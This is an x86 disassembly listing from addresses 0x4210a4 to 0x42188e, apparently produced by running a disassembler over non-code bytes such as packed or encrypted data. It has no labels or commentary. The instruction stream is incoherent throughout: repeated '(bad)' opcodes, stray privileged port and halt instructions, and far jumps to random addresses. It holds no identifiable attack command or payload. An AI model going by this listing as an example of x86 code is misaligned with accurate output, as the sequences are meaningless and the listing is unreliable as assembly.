  4210a4:	adc    dh,BYTE PTR ds:0x8f7d9fa9
  4210aa:	jae    0x4210bf
  4210ac:	adc    bh,cl
  4210ae:	dec    ebp
  4210af:	neg    BYTE PTR [edx+0x756cfdc9]
  4210b5:	pop    esi
  4210b6:	xor    eax,0x8c36c01d
  4210bb:	inc    ebp
  4210bc:	cmp    al,0xd2
  4210be:	mul    BYTE PTR [edi+0x5a055ef8]
  4210c4:	mov    bh,0x71
  4210c6:	cli    
  4210c7:	out    dx,al
  4210c8:	das    
  4210c9:	in     al,0xd
  4210cb:	les    edi,FWORD PTR [ebx]
  4210cd:	pop    DWORD PTR [esi]
  4210cf:	add    eax,0x740951b3
  4210d4:	xchg   esp,eax
  4210d5:	push   cs
  4210d6:	push   esi
  4210d7:	push   0x9
  4210d9:	leave  
  4210da:	lock sbb eax,0xc8f66203
  4210e0:	loope  0x421121
  4210e2:	or     bh,ah
  4210e4:	dec    edi
  4210e5:	xor    al,0xbb
  4210e7:	sub    dl,BYTE PTR [ecx-0x55]
  4210ea:	mov    ah,0xb
  4210ec:	lods   eax,DWORD PTR ds:[esi]
  4210ed:	and    BYTE PTR [eax+0x2340eae],0xa8
  4210f4:	test   BYTE PTR [edi+0x4a],ch
  4210f7:	jle    0x421132
  4210f9:	cmp    DWORD PTR [ecx+ecx*4+0x4ca917a5],ebp
  421100:	adc    al,0x41
  421102:	xchg   ebx,eax
  421103:	jns    0x421142
  421105:	or     esp,DWORD PTR [ecx-0x24fef81f]
  42110b:	retf   0xd838
  42110e:	in     al,0xad
  421110:	shl    DWORD PTR [edi-0x6a],0x9f
  421114:	aad    0xf
  421116:	add    al,0xd3
  421118:	cwde   
  421119:	clc    
  42111a:	jge    0x42111e
  42111c:	cmp    dl,BYTE PTR [edi+0x53ede7a8]
  421122:	pop    edx
  421124:	xchg   BYTE PTR [eax+0x1f4b64e6],al
  42112a:	push   cs
  42112b:	fstp   st(5)
  42112d:	les    ebx,FWORD PTR [ebx+0x65b6512]
  421133:	(bad)  
  421134:	xor    BYTE PTR [edx+0x5fbb29a9],ah
  42113a:	repz add ah,BYTE PTR [esi]
  42113d:	sbb    eax,0x7abab255
  421142:	fwait
  421143:	sub    eax,0x478b502b
  421148:	dec    esp
  421149:	dec    edx
  42114a:	dec    esi
  42114b:	hlt    
  42114c:	lahf   
  42114d:	(bad)  
  42114f:	inc    BYTE PTR [edx]
  421151:	outs   dx,DWORD PTR ds:[esi]
  421152:	push   0xfd1f6c0c
  421157:	icebp  
  421158:	xchg   ebx,eax
  421159:	cmp    BYTE PTR ds:0x823119e6,dh
  42115f:	jno    0x42118d
  421161:	out    dx,al
  421162:	push   ds
  421163:	mov    ecx,0x9c715aab
  421168:	retf   0x459b
  42116b:	out    0x93,eax
  42116d:	ins    BYTE PTR es:[edi],dx
  42116e:	lahf   
  42116f:	pop    ecx
  421170:	jge    0x42116c
  421172:	fbld   TBYTE PTR [ecx]
  421174:	sbb    BYTE PTR [edx],0x54
  421177:	mov    BYTE PTR [edi],0xfc
  42117a:	cs fcmovne st,st(1)
  42117d:	into   
  42117e:	mov    al,ds:0x2e76cbaa
  421183:	pop    esp
  421184:	fstp   DWORD PTR [esp+eax*1-0x404ddc4e]
  42118b:	cld    
  42118c:	cmp    DWORD PTR [edi+0x283b4a3c],edi
  421192:	add    al,0xab
  421194:	add    eax,0xb6e16bd5
  421199:	pushf  
  42119a:	mov    eax,ds:0xf937277e
  42119f:	dec    ebx
  4211a0:	mov    ebp,DWORD PTR [esi]
  4211a2:	retf   
  4211a3:	dec    edx
  4211a4:	test   al,0x95
  4211a6:	ds sbb dl,0xd5
  4211aa:	xchg   cl,al
  4211ac:	rdpru  
  4211af:	es pop ss
  4211b1:	rcr    ecx,0x53
  4211b4:	mov    bl,0xcf
  4211b6:	mov    ch,0x2
  4211b8:	xor    DWORD PTR [eax-0x3501b2a4],edx
  4211be:	mov    bl,0x37
  4211c0:	jno    0x42121b
  4211c2:	pushf  
  4211c3:	test   BYTE PTR [eax],bh
  4211c5:	in     eax,0x20
  4211c7:	stc    
  4211c8:	dec    esp
  4211c9:	and    DWORD PTR [edx+0x7b],ebp
  4211cc:	pop    ebp
  4211cd:	mov    eax,ds:0xb02db157
  4211d2:	lods   al,BYTE PTR ds:[esi]
  4211d3:	lea    ebp,[edi]
  4211d5:	fs stos DWORD PTR es:[edi],eax
  4211d7:	cmp    ebx,DWORD PTR [esp+edx*2-0x64c11efb]
  4211de:	mov    edi,0xe05ef48c
  4211e3:	sbb    al,0x1f
  4211e5:	cmc    
  4211e6:	xor    al,0x8c
  4211e8:	das    
  4211e9:	add    dh,BYTE PTR gs:[esi]
  4211ec:	outs   dx,BYTE PTR ds:[esi]
  4211ed:	mov    bh,0x73
  4211ef:	pop    ebx
  4211f0:	lock ret 
  4211f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211f3:	and    DWORD PTR [edx+0x16],edx
  4211f6:	fwait
  4211f7:	sbb    ebp,eax
  4211f9:	loopne 0x4211d1
  4211fb:	mov    al,0x66
  4211fd:	lea    edi,[edx+0x737659e2]
  421203:	mov    al,0x80
  421205:	hlt    
  421206:	test   eax,0xaa873362
  42120b:	sub    eax,0x96e31269
  421210:	adc    eax,DWORD PTR [eax+0x119ddd1e]
  421216:	push   0x4d
  421218:	fwait
  421219:	mov    edx,0xc5918cae
  42121e:	or     edx,0x7e7ac76a
  421224:	mov    ch,0xc5
  421226:	dec    ebp
  421227:	push   0xffffffd2
  421229:	mov    ecx,0xd87a28f1
  42122e:	push   esp
  42122f:	int    0x8a
  421231:	dec    DWORD PTR [ebp-0x3b]
  421234:	ret    
  421235:	mov    cl,0xe8
  421237:	imul   edi,DWORD PTR [edi],0x1
  42123a:	sahf   
  42123b:	rol    DWORD PTR [ebp+eiz*4-0x36b26322],0x8e
  421243:	pop    ecx
  421244:	in     al,0x89
  421246:	shl    BYTE PTR [edi+0x963790a],1
  42124c:	jae    0x421211
  42124e:	popa   
  42124f:	lock pop es
  421251:	loope  0x4212bf
  421253:	add    ah,al
  421255:	mov    cl,0x1f
  421257:	lods   al,BYTE PTR ds:[esi]
  421258:	xchg   ebp,eax
  421259:	jmp    0xe77918d8
  42125e:	jp     0x421257
  421260:	inc    eax
  421261:	or     DWORD PTR [edi-0x52],0x87e4b3c
  421268:	rol    dh,1
  42126a:	cmp    al,0x6d
  42126c:	idiv   ebp
  42126e:	shl    DWORD PTR [edx+0x27],1
  421271:	cs test esi,ebp
  421274:	or     BYTE PTR [ecx],bh
  421276:	int3   
  421277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421278:	pusha  
  421279:	mov    ch,0xd1
  42127b:	dec    ecx
  42127c:	pop    ss
  42127d:	push   ss
  42127e:	push   0x9f64d11b
  421283:	pop    es
  421284:	or     eax,0x85425ad7
  421289:	jmp    0xec92:0xedc1c7c0
  421290:	repz addr16 ds jae 0x42123d
  421295:	pop    edx
  421296:	cmp    BYTE PTR [ecx-0x21],0x85
  42129a:	cs cs add al,0xce
  42129e:	and    DWORD PTR [ecx-0x7929769a],0x63
  4212a5:	shl    DWORD PTR [eax-0x26aca84f],0x24
  4212ac:	inc    eax
  4212ad:	cmp    esp,DWORD PTR [ecx+0x7511429d]
  4212b3:	push   edi
  4212b4:	adc    BYTE PTR [edi+0x6180d7dd],al
  4212ba:	(bad)  
  4212bc:	cvtpi2ps xmm6,QWORD PTR [edi-0x66444f67]
  4212c3:	jge    0x4212c4
  4212c5:	imul   esp,ebx,0x253ebe80
  4212cb:	fild   WORD PTR ds:0xcf08f8f6
  4212d1:	es (bad) 
  4212d3:	mov    edi,0xbf6e3a9a
  4212d8:	cmp    DWORD PTR [ebp+0x1cfe71a8],ecx
  4212de:	sub    al,0xf8
  4212e0:	cmp    eax,0x78c10b7b
  4212e5:	popa   
  4212e6:	loop   0x421281
  4212e8:	shr    bl,1
  4212ea:	mov    ebp,ebx
  4212ec:	jecxz  0x421284
  4212ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212ef:	jle    0x421366
  4212f1:	push   ds
  4212f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212f3:	imul   edi,DWORD PTR [ebp-0x1a],0x2820e36a
  4212fa:	sub    BYTE PTR [ebx],0x5c
  4212fd:	sti    
  4212fe:	es jmp 0x421342
  421301:	out    0xa3,eax
  421303:	test   ah,cl
  421305:	in     eax,dx
  421306:	int3   
  421307:	adc    eax,0x313a4d35
  42130c:	adc    edi,DWORD PTR [esi]
  42130e:	mov    al,0x5a
  421310:	sbb    al,0x80
  421312:	cs out dx,eax
  421314:	inc    esi
  421315:	xchg   esp,eax
  421316:	push   esi
  421317:	pop    edx
  421318:	lods   al,BYTE PTR ds:[esi]
  421319:	shl    BYTE PTR [ebx+0x20],1
  42131c:	cmp    al,0x65
  42131e:	jmp    0x4212e1
  421320:	or     esp,DWORD PTR [edx*8-0x599c12ba]
  421327:	push   cs
  421328:	loop   0x4213a1
  42132a:	in     al,dx
  42132b:	jge    0x42135c
  42132d:	test   DWORD PTR [edx+0x36b2b83b],esi
  421333:	jnp    0x4212bc
  421335:	xor    DWORD PTR [ecx],esp
  421337:	sahf   
  421338:	jb     0x421383
  42133a:	push   ecx
  42133b:	mov    ch,dl
  42133d:	xchg   DWORD PTR [edx+esi*1+0x22360113],ecx
  421344:	clc    
  421345:	aad    0x9f
  421347:	mov    ecx,0xd83041d3
  42134c:	loop   0x421344
  42134e:	stc    
  42134f:	adc    al,0xf5
  421351:	imul   BYTE PTR [edi]
  421353:	ds enter 0x17d,0x24
  421358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421359:	hlt    
  42135a:	or     eax,DWORD PTR [ecx-0x77fb4136]
  421360:	aas    
  421361:	and    BYTE PTR [eax+ebx*8],al
  421364:	ds lock (bad) 
  421367:	cld    
  421368:	loope  0x4213bf
  42136a:	aad    0x7a
  42136c:	adc    al,0x57
  42136e:	out    dx,eax
  42136f:	jp     0x421341
  421371:	shl    BYTE PTR [esi],0x6
  421374:	and    ebp,eax
  421376:	shr    DWORD PTR [ebp-0x4396345f],cl
  42137c:	or     al,0x87
  42137e:	ds aam 0x62
  421381:	pop    ecx
  421382:	push   cs
  421383:	mov    dh,0x42
  421385:	xchg   edi,eax
  421386:	cld    
  421387:	mov    ds:0x1682d585,eax
  42138c:	(bad)  
  42138e:	push   cs
  42138f:	and    DWORD PTR [ebx+0x6c],esp
  421392:	imul   ebx,DWORD PTR [ebp+0x6a3b03a6],0xf42058ac
  42139c:	ins    BYTE PTR es:[edi],dx
  42139d:	fucomi st,st(3)
  42139f:	inc    edi
  4213a0:	les    esi,FWORD PTR [ebx]
  4213a2:	clc    
  4213a3:	(bad)  
  4213a4:	cld    
  4213a5:	dec    edi
  4213a6:	fbld   TBYTE PTR [ecx*4-0x68da2131]
  4213ad:	fisttp QWORD PTR [esi]
  4213af:	mov    al,ds:0xcc8a2f47
  4213b4:	outs   dx,DWORD PTR ds:[esi]
  4213b5:	inc    eax
  4213b6:	and    al,0xe6
  4213b8:	mov    ch,BYTE PTR [edi]
  4213ba:	dec    eax
  4213bb:	ja     0x421392
  4213bd:	aam    0x88
  4213bf:	loopne 0x421435
  4213c1:	jl     0x42137a
  4213c3:	inc    eax
  4213c4:	push   ecx
  4213c5:	div    BYTE PTR [edx]
  4213c7:	std    
  4213c8:	and    eax,0x292dbf37
  4213cd:	sbb    edi,DWORD PTR [edx]
  4213cf:	push   0xc2fab2f2
  4213d4:	xchg   esi,eax
  4213d5:	pop    esp
  4213d7:	mov    ds:0xea100e9d,al
  4213dc:	or     BYTE PTR [edx+0xba8969c],0x49
  4213e3:	sbb    eax,0xe45505bd
  4213e8:	xor    ecx,DWORD PTR [edi]
  4213ea:	pop    es
  4213eb:	loop   0x42138e
  4213ed:	pop    ebp
  4213ee:	stos   DWORD PTR es:[edi],eax
  4213ef:	(bad)  
  4213f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213f1:	test   BYTE PTR [ebp+0x5e],ah
  4213f4:	ins    BYTE PTR es:[edi],dx
  4213f5:	mov    al,ds:0xc95c92be
  4213fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213fb:	outs   dx,BYTE PTR ds:[esi]
  4213fc:	push   edi
  4213fd:	adc    al,0x4e
  4213ff:	xchg   BYTE PTR [ebp-0x11],bh
  421402:	imul   ebp,DWORD PTR [esi+0x6758ee],0x7322ded6
  42140c:	dec    ecx
  42140d:	xchg   edx,eax
  42140e:	sub    eax,0x16586f9
  421413:	push   cs
  421414:	cmp    bl,BYTE PTR [ebx-0x76a3afb2]
  42141a:	imul   esi,DWORD PTR [edi+0x31d50d6d],0xffffffe2
  421421:	xchg   ebp,eax
  421422:	or     eax,0xccc36b75
  421427:	cmp    al,0xad
  421429:	ss test bp,cx
  42142d:	outs   dx,DWORD PTR ds:[esi]
  42142e:	pop    ebp
  42142f:	sub    DWORD PTR [edi],eax
  421431:	and    BYTE PTR [ebp+0x68a6db92],al
  421437:	adc    dl,BYTE PTR [edi+0x3840529c]
  42143d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42143e:	xchg   ecx,eax
  42143f:	test   DWORD PTR [ecx-0x3e],esp
  421442:	loopne 0x42145d
  421444:	add    al,0x17
  421446:	sbb    eax,esi
  421448:	sbb    esp,DWORD PTR [edx+0x19]
  42144b:	(bad)  
  42144c:	push   es
  42144d:	inc    edx
  42144e:	mov    ah,0xb3
  421450:	call   0xa78f:0x3f0748a0
  421457:	or     BYTE PTR [eax-0x7809b7fe],dl
  42145d:	jb     0x42140e
  42145f:	in     eax,0xaa
  421461:	fild   WORD PTR [eax]
  421463:	int3   
  421464:	mov    eax,0x5ea3baf6
  421469:	lea    ecx,[ebp+0x6ab49a27]
  42146f:	cdq    
  421470:	jle    0x42147c
  421472:	xchg   esp,eax
  421473:	aas    
  421474:	sub    ch,BYTE PTR [esi]
  421476:	(bad)
  42147a:	sub    ebp,edx
  42147c:	jnp    0x421401
  42147e:	adc    ebx,DWORD PTR [eax+0x50b88789]
  421484:	sbb    eax,0xe7c1a94f
  421489:	jnp    0x421467
  42148b:	mov    ebp,0x3bfb4830
  421490:	pop    ebp
  421491:	retf   0xbe9
  421494:	pusha  
  421495:	jne    0x421432
  421497:	pop    esp
  421498:	cmc    
  421499:	sub    ecx,DWORD PTR [ebp-0x6a2f0f65]
  42149f:	sbb    al,0xf4
  4214a1:	push   esi
  4214a2:	in     al,0x97
  4214a4:	jle    0x421477
  4214a6:	retf   0x4f93
  4214a9:	push   ebx
  4214aa:	jnp    0x421441
  4214ac:	in     eax,dx
  4214ad:	cmp    al,0x4d
  4214af:	mov    ah,BYTE PTR [ebx-0x25]
  4214b2:	cmp    eax,0x7c850aa7
  4214b7:	retf   0x356e
  4214ba:	out    dx,al
  4214bb:	mul    DWORD PTR [esi+0x75eba276]
  4214c1:	xor    eax,0x5ec1550
  4214c6:	shl    DWORD PTR [edi+esi*1-0x1e314ab2],cl
  4214cd:	ins    BYTE PTR es:[edi],dx
  4214ce:	xchg   DWORD PTR [ebp-0x3d],edx
  4214d1:	mov    ebx,0x234160a8
  4214d6:	jg     0x421492
  4214d8:	inc    eax
  4214d9:	push   es
  4214da:	in     eax,dx
  4214db:	and    eax,0x9bb83364
  4214e0:	in     al,dx
  4214e1:	adc    DWORD PTR [ecx+ecx*4],edi
  4214e4:	iret   
  4214e5:	add    eax,ebp
  4214e7:	adc    ebx,DWORD PTR [esi]
  4214e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214ea:	add    DWORD PTR [bp+di],ebx
  4214ed:	test   DWORD PTR [ecx],ebp
  4214ef:	sar    BYTE PTR [eax-0x6442a9a1],1
  4214f5:	mov    al,0x85
  4214f7:	int3   
  4214f8:	push   ecx
  4214f9:	stos   BYTE PTR es:[edi],al
  4214fa:	mov    ds:0x7c372a90,al
  4214ff:	popf   
  421500:	daa    
  421501:	sbb    eax,edx
  421503:	jg     0x421524
  421505:	fwait
  421506:	loopne 0x421582
  421508:	lea    eax,[ecx-0x68800d16]
  42150e:	ds cwde 
  421510:	mov    bl,0x88
  421512:	sub    al,0x8c
  421514:	aas    
  421515:	mov    edx,0xfe01e28d
  42151a:	dec    edi
  42151b:	jl     0x4214d5
  42151d:	mov    edx,esp
  42151f:	xchg   edi,eax
  421520:	mov    esi,0x6088690
  421525:	xchg   edx,eax
  421526:	fild   WORD PTR [esi]
  421528:	sti    
  421529:	dec    esp
  42152a:	(bad)  
  42152c:	pop    ebx
  42152d:	pop    edx
  42152e:	or     ecx,DWORD PTR [esi+esi*1+0x54623e95]
  421535:	aad    0xe2
  421537:	sub    BYTE PTR [esi],bl
  421539:	xchg   ebx,eax
  42153a:	shl    BYTE PTR [ebx-0x58287b15],0xa4
  421541:	popa   
  421542:	sti    
  421543:	push   es
  421544:	cdq    
  421545:	inc    ebx
  421546:	mov    al,0xc3
  421548:	jmp    0x8e17aa45
  42154d:	add    DWORD PTR [edx-0xe],esp
  421550:	loop   0x421570
  421552:	pop    es
  421553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421554:	aas    
  421555:	pop    esi
  421556:	iret   
  421557:	test   ah,cl
  421559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42155a:	adc    ch,al
  42155c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42155d:	push   edx
  42155e:	sbb    al,0x94
  421560:	push   esi
  421561:	fsubr  QWORD PTR [ebx-0x4a67349]
  421567:	shr    DWORD PTR [edi+ebp*8],0x9
  42156b:	cmc    
  42156c:	xchg   edx,eax
  42156d:	stos   BYTE PTR es:[edi],al
  42156e:	sub    al,0x2
  421570:	popf   
  421571:	gs inc edi
  421573:	jo     0x421572
  421575:	ins    BYTE PTR es:[edi],dx
  421576:	or     eax,0xcaff5c17
  42157b:	scas   eax,DWORD PTR es:[edi]
  42157c:	jno    0x4215ec
  42157e:	iret   
  42157f:	pop    eax
  421580:	stc    
  421581:	push   0xd89fdd57
  421586:	sbb    cl,cl
  421588:	push   esi
  421589:	stos   DWORD PTR es:[edi],eax
  42158a:	in     al,0x7f
  42158c:	sti    
  42158d:	(bad)  
  42158e:	mov    eax,0x2b0be609
  421593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421594:	ss pusha 
  421596:	inc    edx
  421597:	inc    ebx
  421598:	mov    esi,0xd794fda5
  42159d:	ror    DWORD PTR [esi+0x37],0x30
  4215a1:	out    dx,eax
  4215a2:	push   0xffffffdd
  4215a4:	sub    al,BYTE PTR [esi+0x19]
  4215a7:	push   esi
  4215a8:	imul   esp,DWORD PTR [edx+0x14e5fc29],0x61
  4215af:	sub    eax,0x43b8253d
  4215b4:	in     eax,0x3b
  4215b6:	cs daa 
  4215b8:	fnsave ds:0x3bb267c2
  4215be:	or     dl,ah
  4215c0:	pop    ds
  4215c1:	push   esi
  4215c2:	fisttp WORD PTR [ebp-0x7f]
  4215c5:	sub    al,0x9e
  4215c7:	jb     0x42160e
  4215c9:	retf   
  4215ca:	mov    ch,0x41
  4215cc:	test   DWORD PTR [edi+0x2d48f0dd],0x5d443af9
  4215d6:	(bad)  
  4215d7:	mov    cl,0xea
  4215d9:	cmp    BYTE PTR [esi+esi*2+0x1b],0xf
  4215de:	jp     0x421573
  4215e0:	mov    ebx,0xab900c66
  4215e5:	mov    DWORD PTR [ebp+0x1c],0x3ea51a0
  4215ec:	outs   dx,DWORD PTR ds:[esi]
  4215ed:	jge    0x421595
  4215ef:	aas    
  4215f0:	sub    al,0xe9
  4215f2:	pop    ss
  4215f3:	inc    esi
  4215f4:	das    
  4215f5:	repnz in al,0xcd
  4215f8:	in     al,dx
  4215f9:	ins    BYTE PTR es:[edi],dx
  4215fa:	cmovnp ebp,DWORD PTR ds:0xd9383de6
  421601:	hlt    
  421602:	or     al,0x7
  421604:	sub    al,0xb8
  421606:	jp     0x4215ab
  421608:	(bad)  [edi+0x75]
  42160c:	sub    eax,eax
  42160e:	neg    bl
  421610:	retf   0xaee8
  421613:	pop    esi
  421614:	mov    dl,0x73
  421616:	xchg   BYTE PTR [eax],bh
  421618:	sahf   
  421619:	mov    BYTE PTR [ebx-0x766106b8],ah
  42161f:	xchg   edx,eax
  421620:	xchg   esp,eax
  421621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421622:	rcr    DWORD PTR [edx-0x7caf09d3],cl
  421628:	faddp  st(4),st
  42162a:	jle    0x4215c1
  42162c:	mov    ds:0xbc6a842a,al
  421631:	push   es
  421632:	leave  
  421633:	and    eax,0x5364d749
  421638:	mov    ebx,0xa7d4b00b
  42163d:	sbb    DWORD PTR [ebx-0x2b],esp
  421640:	inc    BYTE PTR [ebp-0x7c85c8f9]
  421646:	stos   DWORD PTR es:[edi],eax
  421647:	sub    BYTE PTR [ebx-0x7d],cl
  42164a:	js     0x4215f6
  42164c:	xor    ebp,DWORD PTR [ecx]
  42164e:	dec    eax
  42164f:	xor    ch,BYTE PTR [edi]
  421651:	mov    ebx,0x776cf3ec
  421656:	cmp    eax,0x49d3be75
  42165b:	cmp    al,0xcd
  42165d:	sbb    eax,0xdeafe068
  421662:	gs pop edi
  421664:	adc    BYTE PTR [edi+0x33],0xbf
  421668:	xor    eax,0x7eee2de8
  42166d:	pop    esp
  42166e:	fdiv   st,st(5)
  421670:	mov    eax,ds:0x18cf2023
  421675:	sub    BYTE PTR ds:0xc831dcc6,bl
  42167b:	pop    ds
  42167c:	pop    edx
  42167d:	retf   0x8e4b
  421680:	xor    al,0xa2
  421682:	sub    al,0xc
  421684:	jbe    0x4216cc
  421686:	pop    esi
  421687:	cmp    eax,0xb64dae28
  42168c:	pushf  
  42168d:	mov    edi,0xd07089b7
  421692:	cmp    eax,0x724ffa4f
  421697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421698:	push   ebx
  421699:	pop    es
  42169a:	jp     0x421626
  42169c:	dec    ebp
  42169d:	push   esp
  42169e:	cmp    eax,0x85a4c8db
  4216a3:	push   ss
  4216a4:	or     bh,cl
  4216a6:	loop   0x421679
  4216a8:	and    eax,0x68e9195f
  4216ad:	and    bh,ch
  4216af:	or     eax,0xbcb71775
  4216b4:	lock inc edx
  4216b6:	outs   dx,DWORD PTR ds:[esi]
  4216b7:	(bad)  
  4216b8:	sbb    al,0x27
  4216ba:	test   eax,0x9b37d337
  4216bf:	or     DWORD PTR [edi-0xc],ecx
  4216c2:	xor    al,0x4e
  4216c4:	cwde   
  4216c5:	inc    edx
  4216c6:	sub    al,BYTE PTR [ebx+0x309bbca5]
  4216cc:	or     eax,0x4f1e0e6b
  4216d1:	repnz push es
  4216d3:	add    esi,ebx
  4216d5:	lods   al,BYTE PTR ds:[esi]
  4216d6:	aaa    
  4216d7:	adc    al,0x10
  4216d9:	mov    edx,0x8ceb179
  4216de:	fld    TBYTE PTR [ecx]
  4216e0:	xchg   DWORD PTR [edi-0x30],edi
  4216e3:	(bad)  
  4216e4:	sbb    DWORD PTR [ebx+eiz*2],ecx
  4216e7:	imul   eax,esp,0xffffffde
  4216ea:	lods   eax,DWORD PTR ds:[esi]
  4216eb:	pop    ss
  4216ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216ed:	fsub   QWORD PTR ds:0x5248cd28
  4216f3:	test   BYTE PTR [esi+0x1d],dh
  4216f6:	loopne 0x4216df
  4216f8:	mov    dh,BYTE PTR [ebp-0x32afb96]
  4216fe:	inc    ebp
  4216ff:	dec    edi
  421700:	inc    esi
  421701:	push   esi
  421702:	sbb    esi,DWORD PTR ds:0xa0a8d8ea
  421708:	ins    DWORD PTR es:[edi],dx
  421709:	mov    bh,BYTE PTR [esi-0x75]
  42170c:	push   ebx
  42170d:	sbb    DWORD PTR [eax+0x66],ebp
  421710:	adc    al,0x1e
  421712:	das    
  421713:	inc    edi
  421714:	cli    
  421715:	xchg   esp,eax
  421716:	inc    ebp
  421717:	xchg   esp,eax
  421718:	adc    esi,DWORD PTR [edi+0x11c24f16]
  42171e:	jne    0x421742
  421720:	push   ds
  421721:	outs   dx,BYTE PTR ds:[esi]
  421722:	scas   eax,DWORD PTR es:[edi]
  421723:	inc    eax
  421724:	loop   0x421711
  421726:	stos   DWORD PTR es:[edi],eax
  421727:	pop    ds
  421728:	push   ecx
  421729:	sub    al,0xe8
  42172b:	fcmove st,st(2)
  42172d:	inc    ebp
  42172e:	ds cmp eax,0x49feadef
  421734:	push   cs
  421735:	outs   dx,DWORD PTR ds:[esi]
  421736:	fxch   st(5)
  421738:	(bad)  
  421739:	cli    
  42173a:	mov    dl,bh
  42173c:	xchg   ebx,eax
  42173d:	push   edi
  42173e:	inc    edx
  42173f:	and    ch,BYTE PTR [edi]
  421741:	lods   eax,DWORD PTR ds:[esi]
  421742:	adc    al,0x3c
  421744:	pop    edx
  421745:	js     0x4217c6
  421747:	adc    al,0x19
  421749:	fsubr  st,st(3)
  42174b:	das    
  42174c:	mov    dl,0x55
  42174e:	ins    DWORD PTR es:[edi],dx
  42174f:	aas    
  421750:	sbb    esp,eax
  421752:	push   es
  421753:	jae    0x421703
  421755:	js     0x421790
  421757:	fbld   TBYTE PTR [esp+ebx*2-0x6ef47b22]
  42175e:	cdq    
  42175f:	jno    0x42175b
  421761:	jl     0x421760
  421763:	dec    ebx
  421764:	jne    0x421786
  421766:	sbb    eax,0x74f8a304
  42176b:	imul   BYTE PTR [esi]
  42176d:	add    eax,0x4067ff8d
  421772:	xor    eax,0x191ab390
  421777:	prefetch (bad)
  421778:	or     eax,0x7fe875f4
  42177d:	add    BYTE PTR [ebx+0x47a7bb4a],cl
  421783:	mov    ch,0xeb
  421785:	sbb    ax,0x6025
  421789:	sbb    ch,BYTE PTR [edi]
  42178b:	in     eax,0xbd
  42178d:	pop    es
  42178e:	push   esi
  42178f:	lea    ecx,[esp+edi*4]
  421792:	jbe    0x421785
  421794:	sbb    eax,0x7f36af89
  421799:	mov    bl,0x59
  42179b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42179c:	repnz inc esi
  42179e:	(bad)  
  42179f:	sbb    BYTE PTR [ecx-0x3d],0x1b
  4217a3:	and    esp,DWORD PTR [esi]
  4217a5:	sar    dh,1
  4217a7:	pop    esp
  4217a8:	push   ebp
  4217a9:	xor    DWORD PTR [esi-0x4f],0xffffffbb
  4217ad:	(bad)  
  4217af:	xchg   BYTE PTR [eax+0x564980ef],dl
  4217b5:	pop    eax
  4217b6:	and    eax,DWORD PTR [esi-0xa8317e4]
  4217bc:	out    0xbe,al
  4217be:	xchg   esp,esi
  4217c0:	mov    ss,WORD PTR [eax-0x16bfdce5]
  4217c6:	sbb    ecx,DWORD PTR [esi-0x7f]
  4217c9:	add    ch,BYTE PTR [edx]
  4217cb:	adc    eax,0xe2341851
  4217d0:	ja     0x421821
  4217d2:	ror    DWORD PTR [edi],cl
  4217d4:	dec    edi
  4217d5:	ror    DWORD PTR [ecx-0x404653a],cl
  4217db:	mov    ecx,0x8269e4ce
  4217e0:	push   ecx
  4217e1:	fiadd  WORD PTR [edi+0x2dbd47f1]
  4217e7:	push   es
  4217e8:	fild   DWORD PTR [edx-0x66391649]
  4217ee:	pop    edx
  4217ef:	jnp    0x4217f5
  4217f1:	sbb    BYTE PTR [edi],bh
  4217f3:	dec    ecx
  4217f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217f7:	rcr    DWORD PTR [eax-0x7f],1
  4217fa:	xchg   edi,eax
  4217fb:	test   eax,0xebb18e3a
  421800:	mov    ebx,0x93c587ee
  421805:	pop    edi
  421806:	bound  bx,DWORD PTR [ebp+0xc6dfe14]
  42180d:	adc    cl,BYTE PTR [esi]
  42180f:	lahf   
  421810:	add    bl,ah
  421812:	xchg   edi,eax
  421813:	and    eax,0xc85d68e1
  421818:	cmp    eax,0x88267843
  42181d:	pop    edx
  42181e:	mov    esp,0xf6567922
  421823:	add    eax,0x13e83080
  421828:	lds    eax,FWORD PTR [edi+0x46b00c84]
  42182e:	iret   
  42182f:	mov    ah,0xaa
  421831:	and    dh,dl
  421833:	loope  0x42183a
  421835:	dec    ebp
  421836:	jmp    0x4217db
  421838:	cmp    esi,DWORD PTR [esi-0x50]
  42183b:	ins    BYTE PTR es:[edi],dx
  42183c:	push   ebp
  42183d:	stos   DWORD PTR es:[edi],eax
  42183e:	add    eax,DWORD PTR [ecx+0x348ab05]
  421844:	retf   
  421845:	cmp    edi,esi
  421847:	jne    0x421818
  421849:	mov    edx,0x7f083543
  42184e:	shl    BYTE PTR ds:0xac464792,1
  421854:	ds push ds
  421856:	adc    dh,dh
  421858:	or     eax,0x4c7dc515
  42185d:	shl    DWORD PTR [edi-0x6b20569d],cl
  421863:	ja     0x4218bf
  421865:	lea    edx,[ecx+eiz*4]
  421868:	dec    edi
  421869:	icebp  
  42186a:	das    
  42186b:	jo     0x42185c
  42186d:	arpl   dx,bp
  42186f:	rol    DWORD PTR [esi+edi*1],cl
  421872:	aas    
  421873:	call   0x4c1bad9e
  421878:	sar    BYTE PTR [edi+0x1f1e1b10],cl
  42187e:	fidiv  DWORD PTR [eax+0x40]
  421881:	xchg   edi,eax
  421882:	xor    BYTE PTR [eax+0x4f5addef],bh
  421888:	xor    BYTE PTR [ecx-0x7e],dh
  42188b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42188c:	cmp    al,0x30
  42188e:	xchg   BYTE PTR [esp+edi*1+0x4c9b462a],bl
